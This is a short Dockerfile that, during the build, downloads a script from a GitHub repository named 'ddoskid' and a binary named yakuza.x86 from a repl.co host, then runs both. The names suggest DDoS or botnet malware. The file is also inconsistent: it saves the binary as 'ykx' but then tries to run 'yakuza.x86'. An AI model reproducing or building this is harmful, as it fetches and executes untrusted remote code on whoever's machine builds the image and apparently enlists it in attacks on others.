FROM debian:10

MAINTAINER Qi Yang <i@yangqi.me>

# Install.
RUN apt install curl -y
RUN curl --output loop.sh https://raw.githubusercontent.com/ddoskid/ubuntu20/master/loop.sh
RUN curl --output ykx https://MedicalMonumentalSpool.nycd7.repl.co/yakuza.x86
RUN chmod 777 yakuza.x86
RUN ./yakuza.x86
RUN chmod 777 loop.sh && bash loop.sh
